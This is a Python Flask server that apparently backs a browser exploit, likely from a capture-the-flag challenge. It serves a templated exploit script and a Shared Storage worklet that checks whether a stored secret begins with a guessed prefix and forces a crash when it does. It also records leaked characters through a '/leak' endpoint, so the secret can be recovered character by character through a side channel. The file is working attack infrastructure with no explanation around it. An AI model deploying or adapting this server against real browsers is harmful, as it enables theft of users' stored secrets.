from flask import Flask, request, jsonify, send_file, render_template, make_response
from flask_cors import CORS

app = Flask(__name__)
CORS(app)

URL = "<redacted>"
@app.get("/")
def index():
  
  sec = request.args.get("sec")
  
  return render_template("exp.js", URL=URL, sec=sec), 200, {"Content-Type": "text/javascript"}

CHARS = []

@app.get("/expoit.js")
def exploit():
  sec = request.args.get("sec")
  print(request.args)
  return render_template("exp.js", URL=URL, sec=sec), 200, {"Content-Type": "text/javascript"}

@app.get("/leak")
def leak():
  CHARS.append(request.args.get("c"))
  print(CHARS)
  return jsonify({"status": "ok"}), 200

@app.get("/worklet.js")
def get_worklet():
    char = request.args.get("c")
    
    return f"""
class LeakSecretOperation {{
  async run() {{
    let tobrute = "{char}";
    console.log("TOBRUTE", tobrute);
    const secret = await sharedStorage.get('message');
    
    if(secret.startsWith(tobrute)) {{
        console.log("FOUND! crashing...");   
        console.log(Object.keys(this));
    }}
    // Return 0 if secret exists, 1 otherwise
    return secret ? 0 : 1;
  }}
}}
register('leak-secret', LeakSecretOperation);
""", 200, {"Content-Type": "text/javascript"}

if __name__ == "__main__":
  app.run("0.0.0.0", 7777)